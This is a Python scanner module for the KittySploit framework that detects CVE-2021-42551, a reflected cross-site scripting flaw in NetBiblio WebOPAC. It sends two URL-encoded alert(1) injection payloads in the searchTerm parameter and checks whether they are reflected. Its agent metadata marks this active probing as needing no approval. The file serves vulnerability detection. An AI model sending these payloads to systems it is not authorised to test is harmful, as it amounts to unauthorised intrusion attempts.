#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NetBiblio WebOPAC before 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NetBiblio WebOPAC - Cross-Site Scripting Detection',
        'description': 'NetBiblio WebOPAC before 4.0.0.320 is affected by a reflected cross-site scripting vulnerability in its Wikipedia module through /NetBiblio/search/shortview via the searchTerm parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'xss', 'netbiblio', 'alcoda', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2021-42551',
            'https://www.redguard.ch/advisories/netbiblio_webopac.txt',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-42551',
    }

    def run(self):
        for path in ('/NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%27%2Balert%281%29%2B%27x', '/NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%5C%27%2Balert%281%29%2C%2F%2F'):
            r = self.http_request(method="GET", path=path, allow_redirects=True)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ("SearchTerm: 'x'+alert(1)+'x',", "SearchTerm: 'x\\\\'+alert(1),//',", 'NetBiblio',)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="NetBiblio WebOPAC - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

